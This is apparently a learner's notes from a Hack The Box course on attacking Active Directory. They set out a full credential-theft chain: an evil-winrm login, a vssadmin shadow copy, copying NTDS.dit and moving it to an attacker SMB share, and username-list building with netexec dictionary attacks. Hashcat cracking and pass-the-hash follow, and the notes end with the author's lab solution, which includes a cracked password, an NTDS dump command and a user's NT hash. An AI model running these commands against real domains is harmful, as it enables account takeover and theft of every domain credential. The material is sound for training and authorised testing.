

Active Directory or AD is a common and critical directory service in modern enterprise networks. AD is something we will repeatedly encounter, so we will need to be familiar with various methods we can use to attack and defend these AD environments. It is safe to conclude that if the organization uses Windows, then AD is used to manage those windows systems. Attacking AD is such an extensive and significant topic we will have multiple modules covering AD.

In this section we will focus primarily on how we can extract credentials through the use of a dictionary attack against AD account and dumping hashes from NTDS.dit file 

Like many of the attacks covered, our target much be reachable over the network. Meaning we must have an established foothold to the internal network. That said there are situations where an organization may be port forwarding to forward the remote desktop protocol 3389 or other protocols used for remote access on their edge router to a system on their internal network. Please know that most methods covered will simulate the steps after initial compromise and when a foothold is established on their internal network. Please know that most methods covered in this module simulate the steps after an initial compromise. Lets take a look at the authentication process once a Windows system has been joined to the domain. This approach will help us better understand the significance of AD and password attacks it can be susceptible to.

![Diagram showing Windows authentication process with lsass.exe, authentication packages, NTLM, Kerberos, and AD Directory Services.](https://academy.hackthebox.com/storage/modules/147/ADauthentication_diagram.png)



Once a windows system is joined to a domain, it will no longer by default reference the SAM database to validate logon requests. That domain-joined system will now send all authentication requests to be validated by the Domain Controller (DC) before allowing a user to logon. However this does not mean the SAM database can no longer be used. Someone looking to logon using a local account in the same database can still do by specifying the host-name of the device proccedded by the user for example.
```
WS01/nameofuser. 
```
or with direct access can type ./ at the logon ui in the username field. This is worthy of consideration becuase we need to be mindful of what system components are impacted by the attacks we perform. It can also give us additional avenues of attack to consider when targeting windows OS's. Keep in mind that we can also study NTDS attacks by keeping track of this [technique](https://attack.mitre.org/techniques/T1003/003/). It may be cool to keep in mind that Local Admin credentials can be used if they are in the SAM database and if a company re-uses local admin credentials well.



## CAPTURING NTDS QUICK WAY
https://www.netexec.wiki/smb-protocol/obtaining-credentials/dump-ntds.dit


## Capturing NTDS.dit
NT Directory Services (NTDS) is the directory service used with AD to find & organize network resources. Recall that NTDS.dit file is stored at %systemroot%/ntds on domain controllers in a forest. the .dit stands for directory information tree. This is the primary database file associated with AD and stores all domain usernames, password hashes and other criticial schema information if this NTDS.dit file can be captured we could potentially compromise every account on the domain. Similar to the technique used in this modules Attacking SAM section. As we practice this think of protected AD and brainstorm a few ways to stop this.

First we can connect to the target DC using EVIL-WINRM

```shell-session
JackTheWizard@htb[/htb]$ evil-winrm -i 10.129.201.57  -u bwilliamson -p 'P@55w0rd!'
```

Once connected we can check to see what privileges bwilliamson gas, We can start with looking at the local group membership using the command 

```shell-session
*Evil-WinRM* PS C:\> net localgroup
```

We are looking to see if the account has local admin rights which is needed to make a copy of the NTDS.dit file, we need local admin or domain admin rights. We also wanna check what domain privledges we have. If the user is a part of the (`Administrators group`) they are a local admin and if they are part of the (`Domain Admins group`) they are domain admins it could also be called something else.


#### Checking User Account Privileges including Domain

Attacking Active Directory & NTDS.dit

```shell-session
*Evil-WinRM* PS C:\> net user bwilliamson

User name                    bwilliamson
Full Name                    Ben Williamson
Comment
User's comment
Country/region code          000 (System Default)
Account active               Yes
Account expires              Never

Password last set            1/13/2022 12:48:58 PM
Password expires             Never
Password changeable          1/14/2022 12:48:58 PM
Password required            Yes
User may change password     Yes

Workstations allowed         All
Logon script
User profile
Home directory
Last logon                   1/14/2022 2:07:49 PM

Logon hours allowed          All

Local Group Memberships
Global Group memberships     *Domain Users         *Domain Admins
The command completed successfully.
```

This account has both Administrators and Domain Administrator rights which means we can do just about anything we want, including making a copy of the NTDS.dit file.

## Creating a shadow copy of the C: drive 
We can use vssadmin to create a Volume Shadow copy or .VSS of the C:  drive or whatever drive the admin chose when installing AD. It is very likely that NTDS will be stored on C: as that is the default location selected at install but it is possible to change the location. We use VSS for this as it is designed to make copies of volumes that may be read and written to actively without needing to bring a particular app or system down. VSS is used in many different backup and recovery software.

Attacking Active Directory & NTDS.dit

```shell-session
*Evil-WinRM* PS C:\> vssadmin CREATE SHADOW /For=C:

vssadmin 1.1 - Volume Shadow Copy Service administrative command-line tool
(C) Copyright 2001-2013 Microsoft Corp.

Successfully created shadow copy for 'C:\'
    Shadow Copy ID: {186d5979-2f2b-4afe-8101-9f1111e4cb1a}
    Shadow Copy Volume Name: \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy2
```


## Copying NTDS.dit from the VSS
We can then copy the NTDS.dit file from the volume shadow copy of C: onto another location on the drive to prepare to move our NTDS.dit to out attacking host.

```shell-session
*Evil-WinRM* PS C:\NTDS> cmd.exe /c copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy2\Windows\NTDS\NTDS.dit c:\NTDS\NTDS.dit

        1 file(s) copied.
```

Before copying NTDS.dit to our attack host, we may want to use the technique we learned earlier to create an SMB share on our attack host. Feel free to go back to the `Attacking SAM` section to review that method if needed. 

\\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy2 is the VSS file root in this we just go in and get the NTDS.dit file from it

#### Transferring NTDS.dit to Attack Host

Now `cmd.exe /c move` can be used to move the file from the target DC to the share on our attack host.

Attacking Active Directory & NTDS.dit

```shell-session
*Evil-WinRM* PS C:\NTDS> cmd.exe /c move C:\NTDS\NTDS.dit \\10.10.15.30\CompData 
```


## Dictionary attacks against AD accounts using Netexec


Keep in mind that a a dictionary attack is essentially using the power of a computer to guess a username and or password. It can be rather noisy and easy to detect to conduct these attacks over a network because they can generate alot of network traffic and alerts on the traget system and as well get eventually denied due to logon attempt restrictions applied through Group Policy.

When we find ourselves in a scenario where a dictionary attack is a viable next step we can benefit from trying to custom tailor our attack as much as possible to the company / target of our fuzzing. We can consider the organization we are working with to perform engagement against and use searches on various social media websites as well as looking for an employee directory on the companies website. Doing this can result in us gaining the names of employees that work at the organization. One of the first things a new employee will get is a username. Many organizations follow a naming convention when creating employees usernames for example my work uses

first initial and last name for example bob ross would be

bross . 
Here are more conventions to consider

|Username Convention|Practical Example for Jane Jill Doe|
|---|---|
|`firstinitiallastname`|jdoe|
|`firstinitialmiddleinitiallastname`|jjdoe|
|`firstnamelastname`|janedoe|
|`firstname.lastname`|jane.doe|
|`lastname.firstname`|doe.jane|
|`nickname`|doedoehacksstuff|

Also often an email addresses structure will give us the employees usernames for example if bob rosses email was bross@email.com we could infer that his username is bross. 

*Often by googling the companies domain name like @domain.com we can get some valid domain names it is also worth checking leaked databases and scraping from various social media sites. Sometimes you can use google dorks to get some usernames.*


## creating a list of  custom usernames

Lets say we have a list of names based on public info we will keep it short.


Let's say we have done our research and gathered a list of names based on publicly available information. We will keep the list relatively short for the sake of this lesson because organizations can have a huge number of employees. Example list of names:

- Ben Williamson
- Bob Burgerstien
- Jim Stevenson
- Jill Johnson
- Jane Doe

We can create a custom list on our attack host using the names above. We can use a command line-based text editor like `Vim` or a graphical text editor to create our list. Our list may look something like this:

Attacking Active Directory & NTDS.dit

```shell-session
JackTheWizard@htb[/htb]$ cat usernames.txt 
bwilliamson
benwilliamson
ben.willamson
willamson.ben
bburgerstien
bobburgerstien
bob.burgerstien
burgerstien.bob
jstevenson
jimstevenson
jim.stevenson
stevenson.jim
```

Of course, this is just an example and doesn't include all of the names, but notice how we can include a different naming convention for each name if we do not already know the naming convention used by the target organization.


We can manually create our list(s) or use an `automated list generator` such as the Ruby-based tool [Username Anarchy](https://github.com/urbanadventurer/username-anarchy) to convert a list of real names into common username formats. Once the tool has been cloned to our local attack host using `Git`, we can run it against a list of real names as shown in the example output below:

Attacking Active Directory & NTDS.dit

```shell-session
JackTheWizard@htb[/htb]$ ./username-anarchy -i /home/ltnbob/names.txt 

ben
benwilliamson
ben.williamson
benwilli
benwill
benw
b.williamson
bwilliamson
wben
w.ben
williamsonb
williamson
williamson.b
williamson.ben

```

Using automated tools can save us time when crafting lists. Still, we will benefit from spending as much time as we can attempting to discover the naming convention an organization is using with usernames because this will reduce the need for us to guess the naming convention.

It is ideal to limit the need to guess as much as possible when conducting password attacks.


## Launching the attack with netexec

Once we have our lists prepared we launch our attack against the target domain controller using a tool such as netexec (new verison of crackmapexec)

We can use it in conjunction with the SMB protocol to send logon requests to the target Domain Controller. Here is the command to do so:

Attacking Active Directory & NTDS.dit

```shell-session
JackTheWizard@htb[/htb]$ nxc smb 10.129.201.57 -u bwilliamson -p /usr/share/wordlists/fasttrack.txt
```

https://www.netexec.wiki/smb-protocol/password-spraying


#### Event Logs from the Attack

![Windows Event Viewer showing security logs with Event ID 4776 for credential validation and event details.](https://academy.hackthebox.com/storage/modules/147/events_dc.png)

It can be useful to know what might have been left behind by an attack. Knowing this can make our remediation recommendations more impactful and valuable for the client we are working with. On any Windows operating system, an admin can navigate to `Event Viewer` and view the Security events to see the exact actions that were logged. This can inform decisions to implement stricter security controls and assist in any potential investigation that might be involved following a breach.

Once we have discovered some credentials, we could proceed to try to gain remote access to the target domain controller and capture the NTDS.dit file.




## CRACKING hashes and gaining credentials

We can proceed with creating a text file with all of the NT hashes or we can copy and paste a specific hash into a terminal session and use hashcat -m 1000 to crack it. 

Although what happens if we are unsuccessful in cracking a hash?

## Pass-the-hash considerations

We can still use hashes to attempt to authenticate using a type of attack called pass the hash or (PtH) a PtH attack takes advantage of  the [NTLM authentication protocol](https://docs.microsoft.com/en-us/windows/win32/secauthn/microsoft-ntlm#:~:text=NTLM%20uses%20an%20encrypted%20challenge,to%20the%20secured%20NTLM%20credentials) to authenticate a user using a password hash. Instead of `username`:`clear-text password` as the format for login, we can instead use `username`:`password hash`. Here is an example of how this would work. However if the Domain is using Kererbos authentication which was designed to get rid of the PtH vulnerabilities in NTLM they may have NTLM disabled so this may not work in all domains. 
#### Pass-the-Hash with Evil-WinRM Example

Attacking Active Directory & NTDS.dit

```shell-session
JackTheWizard@htb[/htb]$ evil-winrm -i 10.129.201.57  -u  Administrator -H "64f12cddaa88057e06a81b54e73b949b"
```





jmarston  lets fuzz this with netexec


```
nxc smb 10.129.202.85 -u jmarston -p fasttrack.txt
```

This took me too many wordlists.


I got a password

jmarston:P@ssword! 

so lets get NTDS easy

```
nxc smb 10.129.202.85 -u jmarston -p 'P@ssword!' --ntds
```


jstapleton

92fd67fd2f49d0e83744aa82363f021b


Lets crack her NT hash


hashcat -m 1000 92fd67fd2f49d0e83744aa82363f021b rockyou.txt